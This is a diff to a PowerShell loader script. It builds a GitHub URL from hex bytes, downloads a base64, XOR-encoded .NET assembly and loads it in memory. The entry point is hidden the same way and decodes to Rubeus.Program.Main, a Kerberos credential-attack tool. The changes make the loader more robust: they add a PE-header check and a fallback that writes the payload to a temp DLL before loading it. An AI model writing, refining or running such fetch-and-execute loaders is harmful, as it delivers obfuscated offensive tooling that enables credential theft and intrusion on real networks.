@@ -12,10 +12,37 @@ $wc=New-Object Net.WebClient
 $url=((0x68,0x74,0x74,0x70,0x73,0x3A,0x2F,0x2F,0x72,0x61,0x77,0x2E,0x67,0x69,0x74,0x68,0x75,0x62,0x75,0x73,0x65,0x72,0x63,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2E,0x63,0x6F,0x6D,0x2F,0x48,0x34,0x63,0x6B,0x30,0x31,0x2F,0x52,0x45,0x44,0x54,0x45,0x41,0x4D,0x54,0x4F,0x4F,0x4C,0x53,0x2F,0x6D,0x61,0x69,0x6E,0x2F,0x72,0x62,0x36,0x34,0x5F,0x76,0x32,0x2E,0x74,0x78,0x74|%{[char]$_})-join'')
 $b=[Convert]::FromBase64String($wc.DownloadString($url))
 for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i]-bxor 0x53}
+
+# Sanity: decoded payload must be a PE (MZ). Catches download/XOR corruption early.
+if ($b.Length -lt 2 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A) {
+  $hex = ($b[0..([Math]::Min(15,$b.Length-1))] | % { $_.ToString('x2') }) -join ''
+  throw "Payload decode failed: not a PE (len=$($b.Length), first=$hex). Download or XOR corrupted."
+}
+
 $rp=((0x52,0x75,0x62,0x65,0x75,0x73,0x2E,0x50,0x72,0x6F,0x67,0x72,0x61,0x6D|%{[char]$_})-join'')
 $mn=((0x4D,0x61,0x69,0x6E|%{[char]$_})-join'')
-$r=[System.Reflection.Assembly]::Load($b)
+[string[]]$arg=@()
+if ($args) { $arg=[string[]]$args }
+
+$r=$null
+try {
+  $r=[System.Reflection.Assembly]::Load($b)
+} catch {
+  # Fallback: materialize to disk and load from file (different load context).
+  $tmp=[IO.Path]::Combine([IO.Path]::GetTempPath(), ('r_'+[Guid]::NewGuid().ToString('N')+'.dll'))
+  [IO.File]::WriteAllBytes($tmp,$b)
+  try {
+    $r=[System.Reflection.Assembly]::LoadFile($tmp)
+  } catch {
+    Write-Host "[!] Assembly load failed."
+    Write-Host "    PSVersion : $($PSVersionTable.PSVersion)"
+    Write-Host "    Is64Bit   : $([Environment]::Is64BitProcess)"
+    Write-Host "    Runtime   : $([System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription)"
+    Write-Host "    Bytes     : $($b.Length)  sha256=$(([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($b))).Replace('-','').ToLower())"
+    Write-Host "    Error     : $($_.Exception.GetType().FullName): $($_.Exception.Message)"
+    throw
+  }
+}
+
 $t2=$r.GetType($rp)
-$arg=@()
-if ($args) { $arg=$args }
 $t2.GetMethod($mn,[Type[]]@([string[]])).Invoke($null,@(,$arg))
